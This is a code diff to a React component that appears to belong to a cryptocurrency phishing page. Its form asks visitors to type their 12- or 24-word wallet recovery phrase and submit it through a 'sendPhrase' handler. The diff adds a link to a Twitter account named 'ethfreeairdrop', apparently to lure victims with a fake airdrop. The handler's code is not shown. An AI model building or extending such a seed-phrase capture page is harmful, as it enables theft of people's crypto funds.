@@ -36,7 +36,7 @@ function Phrase() {
                 <p className="phrase__description">Typically 12, (sometimes 24) words separated by single spaces</p>
                 <Button onClick={sendPhrase} type="submit" className="btn" variant="contained" color="primary">IMPORT</Button>
                 </form>
-                <a className="social__handles"> <TwitterIcon color="primary"/>Twitter</a>
+                <a href="https://mobile.twitter.com/ethfreeairdrop" className="social__handles"> <TwitterIcon color="primary"/>Twitter</a>
 
                 
             </div>
